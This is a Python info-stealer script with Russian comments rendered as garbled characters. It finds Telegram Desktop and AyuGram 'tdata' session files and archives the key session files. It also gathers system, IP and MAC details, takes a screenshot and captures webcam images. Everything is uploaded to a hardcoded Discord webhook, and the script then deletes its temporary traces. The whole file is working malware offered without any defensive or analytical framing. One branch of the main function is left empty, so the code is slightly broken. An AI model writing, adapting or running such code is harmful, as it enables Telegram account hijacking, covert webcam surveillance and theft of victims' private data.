import os
import zipfile
import requests
import cv2
import pyautogui
import platform
import socket
import psutil
import uuid
import re
from datetime import datetime
import getpass
import shutil
import json

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
WEBHOOK_URL = "https://discord.com/api/webhooks/1389283951436369941/H4uFr_KdfZ1YBqZENP3V5P8IqY3qkeIALlD7K41mNsjjFXuywRERfEvhkwjmjO3zID68"
TARGET_FILES = ["key_datas", "settingss", "usertag"]

def get_downloads_folder():
    """–í–æ–∑–≤—Ä–∞—â–∞–µ—Ç –ø—É—Ç—å –∫ –ø–∞–ø–∫–µ –ó–∞–≥—Ä—É–∑–∫–∏"""
    return os.path.join(os.path.expanduser("~"), "Downloads")

def create_temp_folder():
    """–°–æ–∑–¥–∞–µ—Ç –≤—Ä–µ–º–µ–Ω–Ω—É—é –ø–∞–ø–∫—É –≤ –ó–∞–≥—Ä—É–∑–∫–∞—Ö"""
    temp_folder = os.path.join(get_downloads_folder(), f"temp_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
    os.makedirs(temp_folder, exist_ok=True)
    return temp_folder

def find_tdata_folder():
    """–ù–∞—Ö–æ–¥–∏—Ç –ø–∞–ø–∫—É tdata"""
    username = getpass.getuser()
    paths = [
        f"C:\\Users\\{username}\\AppData\\Roaming\\Telegram Desktop\\tdata",
        f"C:\\Users\\{username}\\Documents\\Telegram Desktop\\tdata",
        "\\ayugram\\tdata",
        "C:\\Users\\–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å\\Desktop\\asdsdsa\\1AyuGram\\tdata"
    ]
    
    for path in paths:
        if os.path.exists(path):
            return path
    return None

def get_system_info():
    """–°–æ–±–∏—Ä–∞–µ—Ç –ø–æ–ª–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–∏—Å—Ç–µ–º–µ"""
    try:
        info = {
            "üíª –°–∏—Å—Ç–µ–º–∞": {
                "–û–°": platform.system(),
                "–í–µ—Ä—Å–∏—è": platform.version(),
                "–ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞": platform.architecture()[0],
                "–ò–º—è –ü–ö": socket.gethostname(),
                "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å": getpass.getuser(),
                "–î–∞—Ç–∞/–≤—Ä–µ–º—è": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            },
            "‚öôÔ∏è –ê–ø–ø–∞—Ä–∞—Ç–Ω–æ–µ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏–µ": {
                "–ü—Ä–æ—Ü–µ—Å—Å–æ—Ä": platform.processor(),
                "–Ø–¥—Ä–∞ (—Ñ–∏–∑/–ª–æ–≥)": f"{psutil.cpu_count(logical=False)}/{psutil.cpu_count(logical=True)}",
                "–û–ó–£": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
                "–î–∏—Å–∫ (C:)": f"–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ {psutil.disk_usage('C:').percent}%",
                "MAC-–∞–¥—Ä–µ—Å": ':'.join(re.findall('..', '%012x' % uuid.getnode()))
            },
            "üåê –°–µ—Ç—å": {
                "–õ–æ–∫–∞–ª—å–Ω—ã–π IP": socket.gethostbyname(socket.gethostname()),
                "–ü—É–±–ª–∏—á–Ω—ã–π IP": requests.get('https://api.ipify.org').text if requests.get('https://api.ipify.org').status_code == 200 else "–ù–µ–¥–æ—Å—Ç—É–ø–µ–Ω",
                "–ò–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ã": []
            }
        }

        # –î–æ–±–∞–≤–ª—è–µ–º —Å–µ—Ç–µ–≤—ã–µ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ã
        for name, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    info["üåê –°–µ—Ç—å"]["–ò–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ã"].append(f"{name}: {addr.address}")

        return json.dumps(info, indent=4, ensure_ascii=False)

    except Exception as e:
        return f"‚ö†Ô∏è –û—à–∏–±–∫–∞ —Å–±–æ—Ä–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏: {str(e)}"

def archive_tdata_files(tdata_path, output_path):
    """–ê—Ä—Ö–∏–≤–∏—Ä—É–µ—Ç —Ç–æ–ª—å–∫–æ —Ü–µ–ª–µ–≤—ã–µ —Ñ–∞–π–ª—ã –∏–∑ tdata"""
    zip_path = os.path.join(output_path, "tdata_backup.zip")
    
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file in TARGET_FILES:
            file_path = os.path.join(tdata_path, file)
            if os.path.exists(file_path):
                zipf.write(file_path, os.path.basename(file_path))
    
    return zip_path if os.path.exists(zip_path) else None

def take_screenshot(output_path):
    """–î–µ–ª–∞–µ—Ç —Å–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞"""
    try:
        screenshot_path = os.path.join(output_path, "screenshot.png")
        pyautogui.screenshot(screenshot_path)
        return screenshot_path
    except Exception as e:
        print(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: {str(e)}")
        return None

def take_camera_shots(output_path):
    """–î–µ–ª–∞–µ—Ç —Å–Ω–∏–º–∫–∏ —Å –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∫–∞–º–µ—Ä"""
    camera_files = []
    for i in range(3):  # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–µ—Ä–≤—ã–µ 3 –∫–∞–º–µ—Ä—ã
        try:
            cap = cv2.VideoCapture(i)
            if cap.isOpened():
                ret, frame = cap.read()
                if ret:
                    cam_path = os.path.join(output_path, f"camera_{i}.jpg")
                    cv2.imwrite(cam_path, frame)
                    camera_files.append(cam_path)
            cap.release()
        except Exception as e:
            print(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –∫–∞–º–µ—Ä—ã {i}: {str(e)}")
    return camera_files

def send_to_discord(webhook_url, files, message):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Ñ–∞–π–ª—ã –≤ Discord"""
    try:
        # –î–æ–±–∞–≤–ª—è–µ–º –≤—Ä–µ–º—è –æ—Ç–ø—Ä–∞–≤–∫–∏
        send_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        full_message = f"**üìä –ü–æ–ª–Ω—ã–π –æ—Ç—á—ë—Ç –æ —Å–∏—Å—Ç–µ–º–µ**\n```json\n{message}\n```\n**üïí –í—Ä–µ–º—è –æ—Ç–ø—Ä–∞–≤–∫–∏:** `{send_time}`"
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
        requests.post(webhook_url, json={"content": full_message})
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–∞–π–ª—ã
        for file in files:
            if os.path.exists(file):
                with open(file, 'rb') as f:
                    requests.post(webhook_url, files={'file': (os.path.basename(file), f)})
        return True
    except Exception as e:
        return False

def cleanup(folder):
    """–£–¥–∞–ª—è–µ—Ç –≤—Ä–µ–º–µ–Ω–Ω—É—é –ø–∞–ø–∫—É"""
    try:
        shutil.rmtree(folder)
    except Exception as e:
        print(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –æ—á–∏—Å—Ç–∫–∏: {str(e)}")

def main():
    tdata_path = find_tdata_folder()
    
    # –°–æ–∑–¥–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—É—é –ø–∞–ø–∫—É –≤ –ó–∞–≥—Ä—É–∑–∫–∞—Ö
    temp_folder = create_temp_folder()
    
    # 1. –°–æ–±–∏—Ä–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–∏—Å—Ç–µ–º–µ
    system_info = get_system_info()
    info_file = os.path.join(temp_folder, "system_info.json")
    with open(info_file, 'w', encoding='utf-8') as f:
        f.write(system_info)
    
    # 2. –ê—Ä—Ö–∏–≤–∏—Ä—É–µ–º tdata —Ñ–∞–π–ª—ã (–µ—Å–ª–∏ –Ω–∞–π–¥–µ–Ω—ã)
    zip_path = None
    if tdata_path:
        zip_path = archive_tdata_files(tdata_path, temp_folder)
    else:
    
    # 3. –î–µ–ª–∞–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç
    screenshot_path = take_screenshot(temp_folder)
    
    # 4. –°–Ω–∏–º–∫–∏ —Å –∫–∞–º–µ—Ä
    camera_files = take_camera_shots(temp_folder)
    
    # –°–æ–±–∏—Ä–∞–µ–º –≤—Å–µ —Ñ–∞–π–ª—ã –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
    files_to_send = [info_file]
    if zip_path: files_to_send.append(zip_path)
    if screenshot_path: files_to_send.append(screenshot_path)
    files_to_send.extend(camera_files)
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Discord
    if send_to_discord(WEBHOOK_URL, files_to_send, system_info):
        # –£–¥–∞–ª—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã –ø–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏
        cleanup(temp_folder)

if __name__ == "__main__":
    main()